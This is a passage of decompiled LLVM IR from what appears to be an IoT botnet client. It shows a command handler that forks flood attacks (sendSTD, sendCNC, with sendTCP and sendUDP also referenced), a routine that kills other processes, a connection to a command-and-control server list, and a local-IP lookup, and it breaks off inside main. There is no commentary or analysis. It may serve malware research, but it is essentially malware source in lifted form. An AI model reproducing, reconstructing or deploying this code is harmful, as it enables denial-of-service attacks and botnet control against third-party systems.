dec_label_pc_10308:                               ; preds = %dec_label_pc_102d0
  store i32 0, i32* @r0, align 4
  store i32 ptrtoint (i32* @global_var_1bc90.405 to i32), i32* @r1, align 4
  %v2_10310 = call i32 @__GI_strtok(i32 0, i32 ptrtoint (i32* @global_var_1bc90.405 to i32))
  %v2_10320 = icmp eq i32 %v2_10310, 0
  br i1 %v2_10320, label %dec_label_pc_10354, label %dec_label_pc_102d0

dec_label_pc_1032c:                               ; preds = %dec_label_pc_10250
  %v0_1032c = call i32 @listFork()
  %v2_10334 = icmp eq i32 %v0_1032c, 0
  br i1 %v2_10334, label %dec_label_pc_1033c, label %dec_label_pc_1070c

dec_label_pc_1033c:                               ; preds = %dec_label_pc_1032c
  %v4_10348 = call i32 @sendCNC(i32 %v2_10258, i32 %v1_10270, i32 %v1_1028c, i32 0)
  %v1_10350 = call i32 @__GI__exit(i32 0)
  unreachable

dec_label_pc_10354:                               ; preds = %dec_label_pc_10308, %dec_label_pc_102b4, %dec_label_pc_101cc
  %v2_10358 = load i32, i32* %arg2, align 4
  store i32 ptrtoint ([4 x i8]* @global_var_237b8.918 to i32), i32* @r1, align 4
  %v3_10364 = inttoptr i32 %v2_10358 to i8*
  %v4_10364 = call i32 @__GI_strcoll(i8* %v3_10364, i32 ptrtoint ([4 x i8]* @global_var_237b8.918 to i32))
  %v2_1036c = icmp eq i32 %v4_10364, 0
  br i1 %v2_1036c, label %dec_label_pc_10374, label %dec_label_pc_10590

dec_label_pc_10374:                               ; preds = %dec_label_pc_10354
  %v7_1037c = icmp slt i32 %arg1, 4
  br i1 %v7_1037c, label %dec_label_pc_103c0, label %dec_label_pc_10380

dec_label_pc_10380:                               ; preds = %dec_label_pc_10374
  %v1_10384 = add i32 %tmp, 8
  %v1_10388 = inttoptr i32 %v1_10384 to i32*
  %v2_10388 = load i32, i32* %v1_10388, align 4
  store i32 %v2_10388, i32* @r0, align 4
  %v1_10390 = call i32 @atol(i32 %v2_10388)
  %tmp107 = icmp slt i32 %v1_10390, 1
  br i1 %tmp107, label %dec_label_pc_103c0, label %dec_label_pc_103a0

dec_label_pc_103a0:                               ; preds = %dec_label_pc_10380
  %v1_103a4 = add i32 %tmp, 12
  %v1_103a8 = inttoptr i32 %v1_103a4 to i32*
  %v2_103a8 = load i32, i32* %v1_103a8, align 4
  store i32 %v2_103a8, i32* @r0, align 4
  %v1_103b0 = call i32 @atol(i32 %v2_103a8)
  %v5_103bc = icmp sgt i32 %v1_103b0, 0
  br i1 %v5_103bc, label %dec_label_pc_103d8, label %dec_label_pc_103c0

dec_label_pc_103c0:                               ; preds = %dec_label_pc_103a0, %dec_label_pc_10380, %dec_label_pc_10374
  %v2_103c4 = load i32, i32* @global_var_2d604.55, align 4
  %v3_103d0 = call i32 @sockprintf(i32 %v2_103c4, i32 ptrtoint ([27 x i8]* @global_var_237bc.920 to i32))
  br label %dec_label_pc_1070c

dec_label_pc_103d8:                               ; preds = %dec_label_pc_103a0
  %v1_103dc = add i32 %tmp, 4
  %v1_103e0 = inttoptr i32 %v1_103dc to i32*
  %v2_103e0 = load i32, i32* %v1_103e0, align 4
  %v2_103f0 = load i32, i32* %v1_10388, align 4
  store i32 %v2_103f0, i32* @r0, align 4
  %v1_103f8 = call i32 @atol(i32 %v2_103f0)
  %v2_1040c = load i32, i32* %v1_103a8, align 4
  store i32 %v2_1040c, i32* @r0, align 4
  %v1_10414 = call i32 @atol(i32 %v2_1040c)
  %v2_1042c = call i32 @__GI_strchr(i32 %v2_103e0, i32 44)
  %v2_10434 = icmp eq i32 %v2_1042c, 0
  br i1 %v2_10434, label %dec_label_pc_10568, label %dec_label_pc_1043c

dec_label_pc_1043c:                               ; preds = %dec_label_pc_103d8
  store i32 %v2_103e0, i32* @r0, align 4
  store i32 ptrtoint (i32* @global_var_1bc90.405 to i32), i32* @r1, align 4
  %v2_10448 = call i32 @__GI_strtok(i32 %v2_103e0, i32 ptrtoint (i32* @global_var_1bc90.405 to i32))
  %v2_1055c30 = icmp eq i32 %v2_10448, 0
  br i1 %v2_1055c30, label %dec_label_pc_10590, label %dec_label_pc_1051c

dec_label_pc_1051c:                               ; preds = %dec_label_pc_1043c, %dec_label_pc_10544
  %storemerge1331 = phi i32 [ %v2_1054c, %dec_label_pc_10544 ], [ %v2_10448, %dec_label_pc_1043c ]
  %v0_1051c = call i32 @listFork()
  %v2_10524 = icmp eq i32 %v0_1051c, 0
  br i1 %v2_10524, label %dec_label_pc_1052c, label %dec_label_pc_10544

dec_label_pc_1052c:                               ; preds = %dec_label_pc_1051c
  %v4_10538 = call i32 @sendSTD(i32 %storemerge1331, i32 %v1_103f8, i32 %v1_10414, i32 0)
  %v1_10540 = call i32 @__GI__exit(i32 0)
  unreachable

dec_label_pc_10544:                               ; preds = %dec_label_pc_1051c
  store i32 0, i32* @r0, align 4
  store i32 ptrtoint (i32* @global_var_1bc90.405 to i32), i32* @r1, align 4
  %v2_1054c = call i32 @__GI_strtok(i32 0, i32 ptrtoint (i32* @global_var_1bc90.405 to i32))
  %v2_1055c = icmp eq i32 %v2_1054c, 0
  br i1 %v2_1055c, label %dec_label_pc_10590, label %dec_label_pc_1051c

dec_label_pc_10568:                               ; preds = %dec_label_pc_103d8
  %v0_10568 = call i32 @listFork()
  %v2_10570 = icmp eq i32 %v0_10568, 0
  br i1 %v2_10570, label %dec_label_pc_10578, label %dec_label_pc_1070c

dec_label_pc_10578:                               ; preds = %dec_label_pc_10568
  %v4_10584 = call i32 @sendSTD(i32 %v2_103e0, i32 %v1_103f8, i32 %v1_10414, i32 0)
  %v1_1058c = call i32 @__GI__exit(i32 0)
  unreachable

dec_label_pc_10590:                               ; preds = %dec_label_pc_10544, %dec_label_pc_1043c, %dec_label_pc_10354
  %v2_10594 = load i32, i32* %arg2, align 4
  store i32 ptrtoint ([9 x i8]* @global_var_237d8.922 to i32), i32* @r1, align 4
  %v3_105a0 = inttoptr i32 %v2_10594 to i8*
  %v4_105a0 = call i32 @__GI_strcoll(i8* %v3_105a0, i32 ptrtoint ([9 x i8]* @global_var_237d8.922 to i32))
  %v2_105a8 = icmp eq i32 %v4_105a0, 0
  br i1 %v2_105a8, label %dec_label_pc_105b0, label %dec_label_pc_106e4

dec_label_pc_105b0:                               ; preds = %dec_label_pc_10590
  br label %dec_label_pc_10654

dec_label_pc_105c4:                               ; preds = %dec_label_pc_10654, %dec_label_pc_10688
  %v3_105c8 = mul i32 %storemerge11, 4
  %v2_105d4 = load i32, i32* @global_var_3388c.76, align 4
  %v2_105d8 = add i32 %v2_105d4, %v3_105c8
  %v1_105dc = inttoptr i32 %v2_105d8 to i32*
  %v2_105dc = load i32, i32* %v1_105dc, align 4
  %v2_105e0 = icmp eq i32 %v2_105dc, 0
  br i1 %v2_105e0, label %dec_label_pc_10648, label %dec_label_pc_105e8

dec_label_pc_105e8:                               ; preds = %dec_label_pc_105c4
  %v2_10600 = load i32, i32* %v1_105dc, align 4
  store i32 %v2_10600, i32* @r4, align 4
  %v0_10604 = call i32 @__libc_getpid()
  %v0_1060c = load i32, i32* @r4, align 4
  %v9_1060c = icmp eq i32 %v0_1060c, %v0_10604
  br i1 %v9_1060c, label %dec_label_pc_10648, label %dec_label_pc_10614

dec_label_pc_10614:                               ; preds = %dec_label_pc_105e8
  %v0_10638 = call i32 @kill()
  %v1_10640 = add i32 %stack_var_-44.1, 1
  br label %dec_label_pc_10648

dec_label_pc_10648:                               ; preds = %dec_label_pc_105e8, %dec_label_pc_105c4, %dec_label_pc_10614
  %stack_var_-44.0 = phi i32 [ %stack_var_-44.1, %dec_label_pc_105c4 ], [ %stack_var_-44.1, %dec_label_pc_105e8 ], [ %v1_10640, %dec_label_pc_10614 ]
  %v1_1064c = add i32 %storemerge11, 1
  br label %dec_label_pc_10654

dec_label_pc_10654:                               ; preds = %dec_label_pc_105b0, %dec_label_pc_10648
  %stack_var_-44.1 = phi i32 [ 0, %dec_label_pc_105b0 ], [ %stack_var_-44.0, %dec_label_pc_10648 ]
  %storemerge11 = phi i32 [ 0, %dec_label_pc_105b0 ], [ %v1_1064c, %dec_label_pc_10648 ]
  %v5_1066c = load i32, i32* @global_var_2d610.74, align 4
  %v9_10680 = icmp eq i32 %v5_1066c, 0
  br i1 %v9_10680, label %dec_label_pc_10688, label %dec_label_pc_105c4

dec_label_pc_10688:                               ; preds = %dec_label_pc_10654
  %v2_1066c = load i32, i32* @global_var_2d60c.73, align 4
  store i32 0, i32* @r2, align 4
  %tmp117 = icmp ugt i32 %v2_1066c, %storemerge11
  br i1 %tmp117, label %dec_label_pc_105c4, label %dec_label_pc_106a8

dec_label_pc_106a8:                               ; preds = %dec_label_pc_10688
  %tmp108 = icmp slt i32 %stack_var_-44.1, 1
  %v2_106d4 = load i32, i32* @global_var_2d604.55, align 4
  br i1 %tmp108, label %dec_label_pc_106d0, label %dec_label_pc_106b4

dec_label_pc_106b4:                               ; preds = %dec_label_pc_106a8
  store i32 %stack_var_-44.1, i32* @r2, align 4
  %v3_106c8 = call i32 @sockprintf(i32 %v2_106d4, i32 ptrtoint ([11 x i8]* @global_var_237e4.927 to i32))
  br label %dec_label_pc_106e4

dec_label_pc_106d0:                               ; preds = %dec_label_pc_106a8
  %v3_106e0 = call i32 @sockprintf(i32 %v2_106d4, i32 ptrtoint ([13 x i8]* @global_var_237f0.929 to i32))
  br label %dec_label_pc_106e4

dec_label_pc_106e4:                               ; preds = %dec_label_pc_10590, %dec_label_pc_106b4, %dec_label_pc_106d0
  %v2_106e8 = load i32, i32* %arg2, align 4
  store i32 ptrtoint ([10 x i8]* @global_var_23800.931 to i32), i32* @r1, align 4
  %v3_106f4 = inttoptr i32 %v2_106e8 to i8*
  %v4_106f4 = call i32 @__GI_strcoll(i8* %v3_106f4, i32 ptrtoint ([10 x i8]* @global_var_23800.931 to i32))
  %v2_106fc = icmp eq i32 %v4_106f4, 0
  br i1 %v2_106fc, label %dec_label_pc_10704, label %dec_label_pc_1070c

dec_label_pc_10704:                               ; preds = %dec_label_pc_106e4
  %v1_10708 = call i32 @__GI_exit(i32 0)
  br label %dec_label_pc_1070c

dec_label_pc_1070c:                               ; preds = %dec_label_pc_fc70, %dec_label_pc_fc08, %dec_label_pc_10114, %dec_label_pc_1032c, %dec_label_pc_10568, %dec_label_pc_106e4, %dec_label_pc_fc94, %dec_label_pc_f838, %dec_label_pc_f6e8, %dec_label_pc_ffe4, %dec_label_pc_f7bc, %dec_label_pc_f680, %dec_label_pc_103c0, %dec_label_pc_10238, %dec_label_pc_fde4, %dec_label_pc_faa0, %dec_label_pc_f934, %dec_label_pc_f860, %dec_label_pc_f720, %dec_label_pc_f61c, %dec_label_pc_f5d8, %dec_label_pc_f5a0, %dec_label_pc_10704
  %v24_10710 = phi i32 [ %v0_10114, %dec_label_pc_10114 ], [ %v0_1032c, %dec_label_pc_1032c ], [ %v0_10568, %dec_label_pc_10568 ], [ %v4_106f4, %dec_label_pc_106e4 ], [ %v0_fc94, %dec_label_pc_fc94 ], [ 0, %dec_label_pc_f838 ], [ 0, %dec_label_pc_f6e8 ], [ 0, %dec_label_pc_ffe4 ], [ 0, %dec_label_pc_f7bc ], [ 0, %dec_label_pc_f680 ], [ %v3_103d0, %dec_label_pc_103c0 ], [ %v3_10248, %dec_label_pc_10238 ], [ %v3_fdf4, %dec_label_pc_fde4 ], [ %v3_fab0, %dec_label_pc_faa0 ], [ %v3_f958, %dec_label_pc_f934 ], [ %v0_f848, %dec_label_pc_f860 ], [ %v0_f6f8, %dec_label_pc_f720 ], [ %v1_f634, %dec_label_pc_f61c ], [ %v3_f5f4, %dec_label_pc_f5d8 ], [ %v3_f5b0, %dec_label_pc_f5a0 ], [ %v1_10708, %dec_label_pc_10704 ], [ 0, %dec_label_pc_fc08 ], [ 0, %dec_label_pc_fc70 ]
  store i32 %v3_f43c, i32* @r4, align 4
  store i32 %v6_f43c, i32* @r5, align 4
  store i32 %v9_f43c, i32* @r6, align 4
  store i32 %v12_f43c, i32* @r7, align 4
  store i32 %v15_f43c, i32* @r8, align 4
  store i32 %v18_f43c, i32* @fp, align 4
  ret i32 %v24_10710

; uselistorder directives
  uselistorder i32 %v2_106d4, { 1, 0 }
  uselistorder i32 %stack_var_-44.1, { 0, 1, 2, 4, 3 }
  uselistorder i32 %v2_1054c, { 1, 0 }
  uselistorder i32 %v1_10414, { 1, 0 }
  uselistorder i32 %v1_103f8, { 1, 0 }
  uselistorder i32 %v2_103e0, { 2, 1, 0, 3 }
  uselistorder i32 %v2_10310, { 1, 0 }
  uselistorder i32 %v1_1028c, { 1, 0 }
  uselistorder i32 %v1_10270, { 1, 0 }
  uselistorder i32 %v2_10258, { 2, 1, 0, 3 }
  uselistorder i32* %v1_fff8, { 2, 0, 1, 3 }
  uselistorder i32 %v2_ff64, { 1, 0 }
  uselistorder i32 %storemerge6, { 1, 0 }
  uselistorder i32 %storemerge7, { 1, 0 }
  uselistorder i32 %v1_fe54, { 1, 0 }
  uselistorder i32 %v1_fe38, { 1, 0 }
  uselistorder i32 %v1_fe1c, { 1, 0 }
  uselistorder i32 %v2_fe04, { 2, 1, 0, 3 }
  uselistorder i32 %v2_fc78, { 1, 0 }
  uselistorder i32 %storemerge8, { 1, 0 }
  uselistorder i32 %storemerge9, { 1, 0 }
  uselistorder i32 %storemerge10, { 1, 0 }
  uselistorder i32 %v1_fb10, { 1, 0 }
  uselistorder i32 %v1_faf4, { 1, 0 }
  uselistorder i32 %v1_fad8, { 1, 0 }
  uselistorder i32 %v2_fac0, { 2, 1, 0, 3 }
  uselistorder i32* %stack_var_-4, { 1, 0 }
  uselistorder i32 %tmp, { 7, 8, 9, 10, 11, 12, 13, 14, 15, 16, 17, 2, 3, 4, 5, 6, 18, 1, 19, 20, 21, 22, 0, 23, 24, 25, 28, 27, 26, 29, 30, 31, 32, 33, 34, 35, 36, 37 }
  uselistorder i32 (i32, i32, i32, i32)* @sendSTD, { 1, 0 }
  uselistorder i32 (i32, i32, i32, i32)* @sendCNC, { 1, 0 }
  uselistorder i32 (i32, i32, i32, i32, i32, i32, i32)* @sendTCP, { 1, 0 }
  uselistorder i32 (i32, i32, i32, i32, i32, i32, i32, i32)* @sendUDP, { 1, 0 }
  uselistorder i32 ptrtoint (i32* @global_var_1bc90.405 to i32), { 3, 12, 4, 13, 2, 14, 5, 15, 1, 16, 6, 17, 0, 18, 7, 19, 8, 20, 9, 21, 10, 22, 11, 23 }
  uselistorder i32 1000, { 3, 2, 1, 0 }
  uselistorder i32 ptrtoint ([3 x i8]* @global_var_235b8.884 to i32), { 0, 2, 1, 3 }
  uselistorder i32* @global_var_33888.880, { 0, 4, 1, 5, 2, 6, 3, 7 }
  uselistorder i32 ()* @getdtablesize, { 1, 0 }
  uselistorder i32 ptrtoint ([5 x i8]* @global_var_1b33c.57 to i32), { 0, 2, 1 }
  uselistorder i32 ptrtoint ([4 x i8]* @global_var_234e4.857 to i32), { 0, 3, 1, 4, 2, 5 }
  uselistorder i32 ptrtoint ([7 x i8]* @global_var_23494.851 to i32), { 0, 2, 1, 3 }
  uselistorder i32 (i32)* @ClearHistory, { 3, 2, 1, 0 }
  uselistorder i32 (i32)* @__libc_system, { 9, 8, 7, 6, 5, 4, 3, 2, 1, 0 }
  uselistorder label %dec_label_pc_1070c, { 22, 5, 4, 12, 3, 13, 2, 9, 14, 6, 0, 1, 15, 16, 17, 7, 10, 18, 8, 11, 19, 20, 21 }
  uselistorder label %dec_label_pc_106e4, { 2, 1, 0 }
  uselistorder label %dec_label_pc_10654, { 1, 0 }
  uselistorder label %dec_label_pc_10648, { 2, 0, 1 }
  uselistorder label %dec_label_pc_105c4, { 1, 0 }
  uselistorder label %dec_label_pc_1051c, { 1, 0 }
  uselistorder label %dec_label_pc_102d0, { 1, 0 }
  uselistorder label %dec_label_pc_10038, { 1, 0 }
  uselistorder label %dec_label_pc_ffc4, { 2, 0, 1, 3 }
  uselistorder label %dec_label_pc_ff18, { 1, 0 }
  uselistorder label %dec_label_pc_fed8, { 1, 0 }
  uselistorder label %dec_label_pc_fea0, { 1, 0 }
  uselistorder label %dec_label_pc_fdfc, { 1, 0 }
  uselistorder label %dec_label_pc_fc24, { 1, 0 }
  uselistorder label %dec_label_pc_fbe4, { 1, 0 }
  uselistorder label %dec_label_pc_fbac, { 1, 0 }
  uselistorder label %dec_label_pc_fb68, { 1, 0 }
  uselistorder label %dec_label_pc_fab8, { 1, 0 }
  uselistorder label %dec_label_pc_f814, { 1, 0 }
  uselistorder label %dec_label_pc_f6c4, { 1, 0 }
  uselistorder label %dec_label_pc_f580, { 2, 0, 1 }
  uselistorder label %dec_label_pc_f53c, { 1, 0 }
  uselistorder label %dec_label_pc_f4f8, { 1, 0 }
  uselistorder label %dec_label_pc_f4b4, { 1, 0 }
}

define i32 @initConnection() local_unnamed_addr {
entry:
  %stack_var_-4116 = alloca i32, align 4
  %stack_var_-4 = alloca i32, align 4
  %v3_10718 = load i32, i32* @fp, align 4
  store i32 67360, i32* %stack_var_-4, align 4
  %v2_1071c = ptrtoint i32* %stack_var_-4 to i32
  store i32 %v2_1071c, i32* @fp, align 4
  %v2_10730 = ptrtoint i32* %stack_var_-4116 to i32
  store i32 4096, i32* @r2, align 4
  %v2_10740 = bitcast i32* %stack_var_-4116 to i8*
  %v3_10740 = call i32 @__GI_memset(i8* %v2_10740, i32 0)
  %v2_10748 = load i32, i32* @global_var_2d604.55, align 4
  %v2_1074c = icmp eq i32 %v2_10748, 0
  br i1 %v2_1074c, label %dec_label_pc_10770, label %dec_label_pc_10754

dec_label_pc_10754:                               ; preds = %entry
  %v1_10760 = call i32 @__libc_close(i32 %v2_10748)
  store i32 0, i32* @global_var_2d604.55, align 4
  br label %dec_label_pc_10770

dec_label_pc_10770:                               ; preds = %entry, %dec_label_pc_10754
  %v2_10774 = load i32, i32* @global_var_2d180.934, align 4
  %v2_10778 = icmp eq i32 %v2_10774, 0
  br i1 %v2_10778, label %dec_label_pc_107a4, label %dec_label_pc_10790

dec_label_pc_10790:                               ; preds = %dec_label_pc_10770
  %v1_10798 = add i32 %v2_10774, 1
  br label %dec_label_pc_107a4

dec_label_pc_107a4:                               ; preds = %dec_label_pc_10770, %dec_label_pc_10790
  %storemerge1 = phi i32 [ %v1_10798, %dec_label_pc_10790 ], [ 0, %dec_label_pc_10770 ]
  store i32 %storemerge1, i32* @global_var_2d180.934, align 4
  %v4_107bc = mul i32 %storemerge1, 4
  %v5_107bc = add i32 %v4_107bc, ptrtoint ([17 x i8]** @global_var_2d17c.936 to i32)
  %v6_107bc = inttoptr i32 %v5_107bc to i32*
  %v7_107bc = load i32, i32* %v6_107bc, align 4
  %v2_107c8 = inttoptr i32 %v7_107bc to i8*
  %v3_107c8 = call i32 @strcpy(i32 %v2_10730, i8* %v2_107c8)
  %v2_107ec = call i32 @__GI_strchr(i32 %v2_10730, i32 58)
  %v2_107f4 = icmp eq i32 %v2_107ec, 0
  br i1 %v2_107f4, label %dec_label_pc_10854, label %dec_label_pc_107fc

dec_label_pc_107fc:                               ; preds = %dec_label_pc_107a4
  %v2_10810 = call i32 @__GI_strchr(i32 %v2_10730, i32 58)
  %v1_10818 = add i32 %v2_10810, 1
  store i32 %v1_10818, i32* @r0, align 4
  %v1_10820 = call i32 @atol(i32 %v1_10818)
  %v2_10840 = call i32 @__GI_strchr(i32 %v2_10730, i32 58)
  %v3_10850 = inttoptr i32 %v2_10840 to i8*
  store i8 0, i8* %v3_10850, align 1
  br label %dec_label_pc_10854

dec_label_pc_10854:                               ; preds = %dec_label_pc_107a4, %dec_label_pc_107fc
  %stack_var_-20.0 = phi i32 [ 666, %dec_label_pc_107a4 ], [ %v1_10820, %dec_label_pc_107fc ]
  %v0_10860 = call i32 @socket()
  store i32 %v0_10860, i32* @global_var_2d604.55, align 4
  %v4_10894 = call i32 @connectTimeout(i32 %v0_10860, i32 %v2_10730, i32 %stack_var_-20.0, i32 30)
  %v2_1089c = icmp eq i32 %v4_10894, 0
  %. = zext i1 %v2_1089c to i32
  store i32 %v3_10718, i32* @fp, align 4
  ret i32 %.

; uselistorder directives
  uselistorder i32 %v2_10730, { 2, 0, 1, 3, 4 }
  uselistorder i32* %stack_var_-4, { 1, 0 }
  uselistorder i32 (i32)* @atol, { 40, 39, 38, 37, 36, 35, 34, 33, 32, 31, 30, 29, 28, 27, 26, 25, 24, 23, 22, 21, 20, 19, 18, 17, 16, 15, 14, 13, 12, 11, 10, 9, 8, 7, 6, 5, 4, 3, 2, 1, 0 }
  uselistorder label %dec_label_pc_10854, { 1, 0 }
  uselistorder label %dec_label_pc_107a4, { 1, 0 }
  uselistorder label %dec_label_pc_10770, { 1, 0 }
}

define i32 @getOurIP() local_unnamed_addr {
entry:
  %stack_var_-4182 = alloca i32, align 4
  %stack_var_-4200 = alloca i32, align 4
  %stack_var_-4168 = alloca i8, align 1
  %stack_var_-72 = alloca i32, align 4
  %stack_var_-68 = alloca i32, align 4
  %stack_var_-52 = alloca i32, align 4
  %stack_var_-4208 = alloca i32, align 4
  %stack_var_-16 = alloca i32, align 4
  %v3_108e4 = load i32, i32* @fp, align 4
  store i32 %v3_108e4, i32* %stack_var_-16, align 4
  %v0_10900 = call i32 @socket()
  %v3_10910 = icmp eq i32 %v0_10900, -1
  br i1 %v3_10910, label %dec_label_pc_10918, label %dec_label_pc_10928

dec_label_pc_10918:                               ; preds = %entry
  br label %dec_label_pc_10b90

dec_label_pc_10928:                               ; preds = %entry
  store i32 2, i32* %stack_var_-52, align 4
  store i32 ptrtoint ([8 x i8]* @global_var_2380c.938 to i32), i32* @r0, align 4
  %v2_1096c = call i32 @inet_addr(i32 ptrtoint ([8 x i8]* @global_var_2380c.938 to i32))
  %v1_1097c = call i32 @htons(i32 53)
  %v3_109a0 = bitcast i32* %stack_var_-52 to %sockaddr*
  %v4_109a0 = call i32 @__libc_connect(i32 %v0_10900, %sockaddr* %v3_109a0, i32 16)
  %v3_109b0 = icmp eq i32 %v4_109a0, -1
  br i1 %v3_109b0, label %dec_label_pc_109b8, label %dec_label_pc_109c8

dec_label_pc_109b8:                               ; preds = %dec_label_pc_10928
  br label %dec_label_pc_10b90

dec_label_pc_109c8:                               ; preds = %dec_label_pc_10928
  store i32 16, i32* %stack_var_-72, align 4
  %v2_109d0 = ptrtoint i32* %stack_var_-68 to i32
  %v2_109d4 = ptrtoint i32* %stack_var_-72 to i32
  %v5_109e0 = bitcast i32* %stack_var_-68 to %sockaddr*
  %v6_109e0 = call i32 @__GI_getsockname(i32 %v0_10900, %sockaddr* %v5_109e0, i32 %v2_109d4, i32 %v2_109d0, i32 16)
  %v3_109f0 = icmp eq i32 %v6_109e0, -1
  br i1 %v3_109f0, label %dec_label_pc_109f8, label %dec_label_pc_10a08

dec_label_pc_109f8:                               ; preds = %dec_label_pc_109c8
  br label %dec_label_pc_10b90

dec_label_pc_10a08:                               ; preds = %dec_label_pc_109c8
  store i32 ptrtoint (i32* @global_var_33880.317 to i32), i32* @r2, align 4
  %v4_10a1c = call i32 @__libc_open(i8* getelementptr inbounds ([16 x i8], [16 x i8]* @global_var_23814.941, i32 0, i32 0), i32 0)
  %v2_10ab4 = ptrtoint i8* %stack_var_-4168 to i32
  br label %dec_label_pc_10aac

dec_label_pc_10a2c:                               ; preds = %dec_label_pc_10aac
  %v4_10a40 = call i32 @strstr(i32 %v2_10ab4, i8* getelementptr inbounds ([11 x i8], [11 x i8]* @global_var_23824.943, i32 0, i32 0))
  %v2_10a48 = icmp eq i32 %v4_10a40, 0
  br i1 %v2_10a48, label %dec_label_pc_10a90, label %dec_label_pc_10a70.preheader

dec_label_pc_10a70.preheader:                     ; preds = %dec_label_pc_10a2c
  %v2_10a749 = load i8, i8* %stack_var_-4168, align 1
  %v7_10a7813 = icmp eq i8 %v2_10a749, 9
  br i1 %v7_10a7813, label %dec_label_pc_10a80, label %dec_label_pc_10a64

dec_label_pc_10a64:                               ; preds = %dec_label_pc_10a70.preheader, %dec_label_pc_10a64
  %v4_10a7014 = phi i32 [ %v1_10a68, %dec_label_pc_10a64 ], [ %v2_10ab4, %dec_label_pc_10a70.preheader ]
  %v1_10a68 = add i32 %v4_10a7014, 1
  %v5_10a6c = inttoptr i32 %v1_10a68 to i8*
  %v2_10a74 = load i8, i8* %v5_10a6c, align 1
  %v7_10a78 = icmp eq i8 %v2_10a74, 9
  br i1 %v7_10a78, label %dec_label_pc_10a80, label %dec_label_pc_10a64

dec_label_pc_10a80:                               ; preds = %dec_label_pc_10a64, %dec_label_pc_10a70.preheader
  %storemerge3.lcssa = phi i8* [ %stack_var_-4168, %dec_label_pc_10a70.preheader ], [ %v5_10a6c, %dec_label_pc_10a64 ]
  store i8 0, i8* %storemerge3.lcssa, align 1
  br label %dec_label_pc_10ad4

dec_label_pc_10a90:                               ; preds = %dec_label_pc_10a2c
  store i32 4096, i32* @r2, align 4
  %v3_10aa8 = call i32 @__GI_memset(i8* nonnull %stack_var_-4168, i32 0)
  br label %dec_label_pc_10aac

dec_label_pc_10aac:                               ; preds = %dec_label_pc_10a08, %dec_label_pc_10a90
  %v4_10ac4 = call i32 @fdgets(i32 %v2_10ab4, i32 4096, i32 %v4_10a1c, i32 %v2_10ab4)
  %v2_10acc = icmp eq i32 %v4_10ac4, 0
  br i1 %v2_10acc, label %dec_label_pc_10ad4, label %dec_label_pc_10a2c

dec_label_pc_10ad4:                               ; preds = %dec_label_pc_10aac, %dec_label_pc_10a80
  %v1_10ad8 = call i32 @__libc_close(i32 %v4_10a1c)
  %v4_10ae8 = load i8, i8* %stack_var_-4168, align 1
  %v2_10aec = icmp eq i8 %v4_10ae8, 0
  br i1 %v2_10aec, label %dec_label_pc_10b84, label %dec_label_pc_10af4

dec_label_pc_10af4:                               ; preds = %dec_label_pc_10ad4
  %v2_10afc = ptrtoint i32* %stack_var_-4200 to i32
  %v3_10b14 = call i32 @strcpy(i32 %v2_10afc, i8* nonnull %stack_var_-4168)
  %v3_10b34 = call i32 @ioctl(i32 %v0_10900, i32 35111, i32 %v2_10afc)
  %v2_10b54 = ptrtoint i32* %stack_var_-4182 to i32
  br label %dec_label_pc_10b44

dec_label_pc_10b44:                               ; preds = %dec_label_pc_10af4, %dec_label_pc_10b44
  %storemerge47 = phi i32 [ 0, %dec_label_pc_10af4 ], [ %v1_10b70, %dec_label_pc_10b44 ]
  %v2_10b5c = add i32 %storemerge47, %v2_10b54
  %v1_10b60 = inttoptr i32 %v2_10b5c to i8*
  %v2_10b60 = load i8, i8* %v1_10b60, align 1
  %v4_10b68 = add i32 %storemerge47, ptrtoint (i32* @global_var_2d614.945 to i32)
  %v5_10b68 = inttoptr i32 %v4_10b68 to i8*
  store i8 %v2_10b60, i8* %v5_10b68, align 1
  %v1_10b70 = add nuw nsw i32 %storemerge47, 1
  %v7_10b80 = icmp slt i32 %v1_10b70, 6
  br i1 %v7_10b80, label %dec_label_pc_10b44, label %dec_label_pc_10b84

dec_label_pc_10b84:                               ; preds = %dec_label_pc_10b44, %dec_label_pc_10ad4
  %v1_10b88 = call i32 @__libc_close(i32 %v0_10900)
  %v3_10ba4.pre = load i32, i32* %stack_var_-4208, align 4
  br label %dec_label_pc_10ba0

dec_label_pc_10b90:                               ; preds = %dec_label_pc_109f8, %dec_label_pc_109b8, %dec_label_pc_10918
  store i32 0, i32* %stack_var_-4208, align 4
  br label %dec_label_pc_10ba0

dec_label_pc_10ba0:                               ; preds = %dec_label_pc_10b84, %dec_label_pc_10b90
  %v3_10ba4 = phi i32 [ %v3_10ba4.pre, %dec_label_pc_10b84 ], [ 0, %dec_label_pc_10b90 ]
  %v2_10bac = load i32, i32* %stack_var_-16, align 4
  store i32 %v2_10bac, i32* @fp, align 4
  ret i32 %v3_10ba4

; uselistorder directives
  uselistorder i32 %storemerge47, { 2, 1, 0 }
  uselistorder i32 %v1_10a68, { 1, 0 }
  uselistorder i32 %v2_10ab4, { 1, 3, 0, 2 }
  uselistorder i32 %v0_10900, { 1, 0, 2, 3, 4 }
  uselistorder i32* %stack_var_-4208, { 1, 0 }
  uselistorder i32* %stack_var_-72, { 1, 0 }
  uselistorder i8* %stack_var_-4168, { 3, 5, 2, 0, 1, 4 }
  uselistorder i32 (i32)* @htons, { 12, 11, 10, 9, 8, 7, 6, 5, 4, 13, 3, 2, 1, 0 }
  uselistorder i32 53, { 0, 2, 1 }
  uselistorder label %dec_label_pc_10ba0, { 1, 0 }
  uselistorder label %dec_label_pc_10b44, { 1, 0 }
  uselistorder label %dec_label_pc_10aac, { 1, 0 }
  uselistorder label %dec_label_pc_10a64, { 1, 0 }
}

define i32 @getBuild() local_unnamed_addr {
entry:
  ret i32 ptrtoint ([7 x i8]* @global_var_23830.947 to i32)
}

define i32 @main(i32 %argc, i8** %argv) local_unnamed_addr {
entry:
  %stack_var_-5744 = alloca i32, align 4
  %stack_var_-112 = alloca i32, align 4
  %stack_var_-1648 = alloca i32, align 4
  %stack_var_-624 = alloca i32, align 4
  %stack_var_-368 = alloca i32, align 4
  %stack_var_-4 = alloca i32, align 4
  %stack_var_-24 = alloca i32, align 4
  %v3_10be4 = load i32, i32* @r4, align 4
  store i32 %v3_10be4, i32* %stack_var_-24, align 4
  store i32 68588, i32* %stack_var_-4, align 4
  %v19_10be4 = ptrtoint i32* %stack_var_-24 to i32
  %v2_10be8 = ptrtoint i32* %stack_var_-4 to i32
  store i32 %v2_10be8, i32* @fp, align 4
  %v1_10c2c = bitcast i8** %argv to i32*
  %v2_10c2c = load i32, i32* %v1_10c2c, align 4
  store i32 %v2_10c2c, i32* @r4, align 4
  %v2_10c44 = load i32, i32* %v1_10c2c, align 4
  %v1_10c48 = inttoptr i32 %v2_10c44 to i8*
